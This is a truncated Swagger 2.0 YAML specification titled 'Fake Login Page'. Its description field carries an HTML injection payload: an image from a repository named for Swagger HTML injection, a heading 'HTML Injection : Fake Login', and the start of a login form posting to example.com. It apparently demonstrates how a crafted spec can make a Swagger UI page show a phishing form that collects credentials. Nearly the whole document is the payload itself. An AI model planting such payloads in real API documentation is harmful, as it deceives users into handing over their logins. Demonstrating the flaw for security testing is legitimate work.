swagger: '2.0'
info:
  version: 1.0.0
  title: Fake Login Page
  description: |
    <img src="https://raw.githubusercontent.com/Ravimdamco1/Swagger-HTML_Injecation/main/html-injection.png" alt="HTML Injection Image" width="600"><br>
    <div class="login-form">
        <div class="heading">
            <h1>HTML Injection : Fake Login</h1>
        </div>
        <div class="form-container">
            <form action="https://example.com/login" method="post" class="form-signin">
                <div class="form-group">
